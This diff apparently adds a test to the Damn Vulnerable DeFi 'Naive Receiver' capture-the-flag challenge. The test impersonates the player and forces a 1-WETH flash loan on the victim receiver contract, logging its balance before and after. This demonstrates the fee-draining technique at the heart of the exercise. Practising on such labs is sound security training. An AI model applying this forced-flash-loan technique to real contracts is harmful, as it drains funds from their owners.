@@ -74,6 +74,14 @@ contract NaiveReceiverChallenge is Test {
         );
     }
 
+    function test_drainReceiver() public {
+        vm.prank(player);
+
+        console.log("Balance before: ", weth.balanceOf(address(receiver)));
+        pool.flashLoan(receiver, address(weth), 1 ether, bytes(""));
+        console.log("Balance after: ", weth.balanceOf(address(receiver)));
+    }
+
     /**
      * CODE YOUR SOLUTION HERE
      */
